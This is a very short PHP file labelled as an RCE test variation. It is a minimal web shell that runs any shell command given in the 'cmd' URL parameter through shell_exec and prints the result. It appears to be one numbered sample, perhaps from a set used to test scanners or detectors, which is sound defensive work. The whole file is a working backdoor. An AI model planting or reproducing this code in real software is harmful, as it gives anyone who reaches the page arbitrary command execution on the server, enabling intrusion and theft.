<?php
// RCE test variation #919
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>